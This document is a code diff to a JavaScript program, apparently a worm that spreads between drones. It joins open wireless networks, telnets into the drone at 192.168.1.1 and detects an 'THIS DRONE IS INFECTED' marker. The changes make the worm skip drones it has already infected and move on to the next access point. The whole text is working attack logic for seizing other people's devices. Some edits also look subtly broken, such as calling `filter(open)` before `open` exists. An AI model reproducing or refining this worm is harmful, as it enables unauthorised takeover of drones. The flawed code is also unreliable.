@@ -41,17 +41,23 @@ function attack () {
             else dhcp(function (err) {
                 if (err) setTimeout(attack, 5000)
                 else setTimeout(function () {
-                    telnet('192.168.1.1');
+                    telnet('192.168.1.1', function(err) {
+                      if (err) setTimeout(withNodes(filter(open)), 5000);
+                    });
                 }, 2000)
             })
         });
 
+        setTimeout(withNodes(filter(open)), 5000);
+    }
+
+    function filter(nodes) {
         // Filter out the used ap
         var open = nodes.filter(function (node) {
             return node.essid !== ap.essid;
         });
 
-        setTimeout(withNodes(open), 5000);
+        return open
     }
 }
 
@@ -92,7 +98,7 @@ function getAddr (cb) {
     });
 }
 
-function telnet (addr) {
+function telnet (addr, cb) {
     console.log('> telnet ' + addr);
     var s = net.connect(23, addr);
     s.pipe(process.stdout, { end : false });
@@ -103,7 +109,8 @@ function telnet (addr) {
     s.on('data', function ondata (buf) {
         if (/THIS DRONE IS INFECTED/.test(buf)) {
             console.log('already infected');
-            //s.destroy();
+            s.destroy();
+            cb(true)
         }
 
         String(buf).split('\n').forEach(function (line) {
